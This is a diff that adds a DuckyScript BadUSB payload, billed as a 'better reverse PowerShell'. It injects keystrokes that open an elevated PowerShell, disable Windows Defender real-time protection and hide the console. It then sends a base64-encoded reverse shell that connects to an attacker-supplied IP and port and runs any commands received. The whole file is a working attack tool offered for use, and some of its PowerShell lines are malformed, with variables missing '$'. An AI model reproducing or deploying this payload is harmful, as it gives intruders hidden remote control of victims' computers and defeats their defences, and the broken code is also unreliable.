@@ -1,0 +1,35 @@
+REM Author: UNC0V3R3D (UNC0V3R3D#8662 on Discord)
+REM Description: Better reverse PowerShell. In case of problems, please open an issue.
+REM Version: 1.0
+REM Category: Remote-Access
+DELAY 750
+WINDOWS d
+DELAY 1500
+WINDOWS r
+DELAY 1500
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 560
+LEFTARROW
+DELAY 500
+ENTER
+DELAY 700
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+DELAY 700
+STRING Add-Type -MemberDefinition @'[DllImport("user32.dll")] public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'@ -Name WinAPI -Namespace Win32 -PassThru;$Window=[Win32.WinAPI]::FindWindow("ConsoleWindowClass",(Get-Process -Id $PID).MainWindowTitle);$Win32.WinAPI::ShowWindow($Window,0)
+DELAY 700
+STRING ip = 'YOUR-IP HERE';
+ENTER
+DELAY 700
+STRING port = 'PORT HERE';
+ENTER
+DELAY 700
+STRING encoded_command = 'cG93ZXJzaGVsbCAtbm9wIC1XIGhpZGRlbiAtbm9uaSAtZXAgYnlwYXNzIC1jICIkVENQQ2xpZW50ID0gTmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJzx1c2VyX2RlZmluZWRfaXA+JywgPHVzZXJfZGVmaW5lZF9wb3J0Pik7JE5ldHdvcmtTdHJlYW0gPSAkVENQQ2xpZW50LkdldFN0cmVhbSgpOyRTdHJlYW1Xcml0ZXIgPSBOZXctT2JqZWN0IElPLlN0cmVhbVdyaXRlcigkTmV0d29ya1N0cmVhbSk7ZnVuY3Rpb24gV3JpdGVUb1N0cmVhbSAoJFN0cmluZykge1tieXRlW11dJHNjcmlwdDpCdWZmZXIgPSAwLi4kVENQQ2xpZW50LlJlY2VpdmVCdWZmZXJTaXplIHwgJSB7MH07JFN0cmVhbVdyaXRlci5Xcml0ZSgkU3RyaW5nICsgJ1NIRUxMPiAnKTskU3RyZWFtV3JpdGVyLkZsdXNoKCl9V3JpdGVUb1N0cmVhbSAnJzt3aGlsZSgoJEJ5dGVzUmVhZCA9ICROZXR3b3JrU3RyZWFtLlJlYWQoJEJ1ZmZlciwgMCwgJEJ1ZmZlci5MZW5ndGgpKSAtZ3QgMCkgeyRDb21tYW5kID0gKFt0ZXh0LmVuY29kaW5nXTo6VVRGOCkuR2V0U3RyaW5nKCRCdWZmZXIsIDAsICRCeXRlc1JlYWQgLSAxKTskT3V0cHV0ID0gdHJ5IHtJbnZva2UtRXhwcmVzc2lvbiAkQ29tbWFuZCAyPiYxIHwgT3V0LVN0cmluZ30gY2F0Y2ggeyRfIHwgT3V0LVN0cmluZ31Xcml0ZVRvU3RyZWFtICgkT3V0cHV0KX0kU3RyZWFtV3JpdGVyLkNsb3NlKCki'
+ENTER
+DELAY 700
+STRING -e encoded_command
+ENTER
+DELAY 2000
+STRING -e JFdpbmRvdz0kV2luQVBJOjpGaW5kV2luZG93KCJDb25zb2xlV2luZG93Q2xhc3MiLChHZXQtUHJvY2VzcyAtSWQgJFBJRCkuTWFpbldpbmRvd1RpdGxlKTskV2luQVBJOjpTaG93V2luZG93KCRXaW5kb3csMCk=
+ENTER
